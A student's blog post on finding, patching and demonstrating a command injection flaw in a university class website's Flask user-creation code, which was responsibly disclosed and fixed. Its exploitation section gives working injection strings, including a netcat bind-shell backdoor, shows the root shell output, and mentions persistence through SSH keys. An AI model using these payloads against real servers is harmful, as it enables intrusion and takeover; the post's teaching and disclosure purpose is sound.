---
layout: post
date: 2014-03-01 14:00
title: iHackedIT
categories: web security hacking python
comments: true
---

*Discovering, patching, and exploiting a simple command injection webapp*

## Introduction

The university that I study at, [Northeastern](http://neu.edu) has an awesome [Entrepreneurs Club](http://www.northeastern.edu/entrepreneurs/). One of the programs that they run is called [iMadeIT](http://www.northeastern.edu/entrepreneurs/programs/imadeit/) which is a series of workshops designed to help entrepreneurs with a nontechnical background to learn about web development. This post is going go over a vulnerability I discovered in the iMadeIT class website, how I patched, and how an attacker might exploit it in a real situation.

## Background

The workshops are taught using [Flask](http://flask.pocoo.org/), a Python microframework for web development known for its simplicity and ease of use for beginners. Students taking the class would sign up at [imadeit.nu](http://imadeit.nu), which would make them an account on the website for class management purposes, but also would interestingly create an account for them on the server running the iMadeIT site as well as allow them to "register" a TCP port to run their Flask app on. This would allow students to have a live link on the internet so they could show off what they've been working on to people (instead of just running on localhost) without requiring everyone to have their own server.

## The Vulnerability

Anyway, the iMadeIT guys open sourced the [code](https://github.com/imadeitnortheastern/spring2014) that runs their imadeit.nu website and since it is actually written in Flask which is something I've been meaning to learn for a while now, I decided to take a look at it to see if I could understand anything.

After poking around in the code for a bit, I noticed this particularly interesting function:

```python
def create(name, password):
    {...}
    return os.system('useradd -p {} -s /bin/bash -d /home/{} -m {}'.format(enc_pass, name, name))
```

This is what gives the user their own account on the server. If we trace the function calls, we can see that this function is called from the `create_account` function. Heavily edited to only show relevant sections, it looks like this:

```python
def create_account():
    {...}
    name = request.form['create_username']
    pw = request.form['create_pw']
    {...}
    user.create(name, pw)
    {...}
```

Notice anything? The username is taken from the webpage form and directly passed into the `create` function without any type of sanitization, creating a classic [command injection](https://www.owasp.org/index.php/Command_Injection) vulnerability. What this essentially means is that it's possible for an attacker to put a specially formatted string in the username field that will allow them to execute arbitrary commands on the server.

For example, under ordinary circumstances, a user might enter "mark" as their username, so the `os.system()` call would execute:

```sh
useradd -p {encrypted password} -s /bin/bash -d /home/mark -m mark
```

Let's say a user entered "mark; ls -l #". Now, `os.system()` is going to execute:

```sh
useradd -p {encrypted password} -s /bin/bash -d /home/mark; ls -l; # -m mark; ls -l #
```

This will create the user "mark", but it will also cause `ls -l` to be executed, which will list the files in the directory. Now the user that entered this in the form isn't going to see anything; the command executes internally on the server. Hopefully you're seeing now why this is bad - anyone can execute any command on the server as the user that is running the Flask app. In this case it's particularly bad, because the app is running on port 80 of the server which is a "privileged" port. Since only the superuser is allowed to run network services on ports below 1024, essentially anyone now has root access to the server.

As a side note, the "#" in the injection is there to comment out the rest of the command (the "-m" part) so it doesn't interfere with the injection.

## Patching

This is actually a really easy vulnerability to protect against, all that's required is to make sure that that the username and password fields are checked in some form before they are sent to the system call. In this case, we don't have to worry about the password, because it goes through encryption before being used in the system call, so any attempts to inject in the password field would fail when the attacker's injection gets encrypted.

To check the username input, it's important to use a [positive security model](https://www.owasp.org/index.php/Positive_security_model) (a whitelist) over a negative one. This is because using a blacklist of specific characters that aren't allowed can be potentially incomplete and leaves the attacker room to find sneaky ways to exploit this vulnerability using alternative characters that aren't in your blacklist. As a general rule, it's better to use a whitelist of only the characters that are permitted. In this case, for a username, let's say that users should only be allowed to have usernames with lowercase letters, uppercase letters, underscores, and periods. Writing a function to check for this would look like this:


```python
import re
def valid_username(name):
    if re.search('[^\w.]', name):
        return False
    else
        return True
```

In this particular approach, we aren't *really* sanitizing the input, we're just checking it's validity. In this case, if this function returned false, the `create_account` function would fail, and we would show an error to the user. An alternative would be to attempt to correct invalid user input by removing invalid characters, however despite potential UX arguments, I think it's personally better just to halt completely and let the user sort it out on their end.

### Exploiting

Now that we've described how the vulnerability works, and how to protect against it, let's dirty our white hats a little and check out some steps an attacker might take once discovering the vulnerability.

First of all, we know that we can execute arbitrary commands on the server as the root user. To most, this pretty much is already the definition of being 0wned. However, doing so is sort of awkward; we have to go to the login form and create a new user for every command we want to execute. Let's use netcat to create a rudimentary backdoor into the system by telling netcat to listen on an arbitrary port (say, 1337) and executing a certain file upon receiving a connection (say, `/bin/sh`).

This command looks like

```sh
$ netcat -l -p 1337 -e /bin/sh
```

and so our injection would look like

```sh
mark; netcat -l -p 1337 -e /bin/sh & #
```

Notice that I added a "&" before the "#" in the injection. This will cause the backdoor to run in the background because otherwise the flask process would stop while the backdoor is running, and the webapp would stop working. Not very stealthy. When we enter this into the create account form, we won't get any sort of confirmation that our backdoor is working, however we'll know soon enough when we test it. To connect, all we need to do is run

    $ netcat [ip address] 1337

which will attempt to create a simple TCP connection to the IP address of the server on the same port you specified earlier. If it worked, you won't get a prompt, but you'll have a shell that you can enter commands at. With spaces added for ease of reading, this looks like

    $ netcat 1.2.3.4 1337
    
    ls
    imadeit.db
    imadeit.py
    schema.sql
    static
    templates
    user.py
    user.pyc
    
    whoami
    root
    
    echo $SHELL
    /bin/bash

Now, the server has been totally owned. Next steps could include adding your ssh public key to the `~/.ssh/authorized_keys` file for enhanced persistence if the server got restarted, or if someone saw your backdoor and killed it. In a situation where the app wasn't running on port 80 and was running on a nonprivileged port instead, you wouldn't necessarily have root access so you would then use a local exploit to escalate privileges. However for this situation, even exploiting this vulnerability at all is sort of pointless because the webapp actually *creates an account for you* on the server which you can ssh into, and legitimately get a shell.

## Conclusion

I hope you can see now how even something as simple as checking user input in a webapp can go a long way in securing your web site and making sure you don't get hacked. After discovering the vuln, I submitted a pull request to iMadeIT's repo on github, which was merged and deployed an astonishing [*5 minutes*](https://github.com/imadeitnortheastern/spring2014/pull/1) later, so serious props to them for that. I've never discovered a serious vulnerability "in the wild" before, so it was sort of cool to go through the process of submitting the patch and then confirming that it was working in the live site.

That's all, thanks for reading!
